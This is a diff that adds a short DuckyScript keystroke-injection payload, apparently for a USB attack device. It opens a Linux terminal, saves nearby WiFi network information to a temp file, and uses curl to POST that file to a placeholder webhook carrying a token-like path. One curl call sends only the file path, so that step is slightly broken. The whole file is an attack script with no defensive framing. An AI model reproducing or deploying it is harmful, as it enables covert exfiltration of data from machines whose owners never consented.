@@ -1,0 +1,15 @@
+DELAY 1000
+CTRL-ALT t
+DELAY 1000
+STRING nmcli device wifi list > /tmp/wifi_info.txt
+DELAY 500
+ENTER
+DELAY 2000
+STRING curl -X POST -H "Content-Type: application/json" -d '{"content": "WiFi Network Information:", "file": "/tmp/wifi_info.txt"}' *WEBHOOK HERE*
+DELAY 500
+ENTER
+DELAY 2000
+STRING curl -X POST -H "Content-Type: multipart/form-data" -F "file=@/tmp/wifi_info.txt" *WEBHOOK HERE*/idFYrh_UT9XUqcHvsLjY6EXg-TzEy9NqVLb4S_2e_BGqAdXYYRNuKhfTl8WePXLLBnSi
+DELAY 500
+ENTER
+
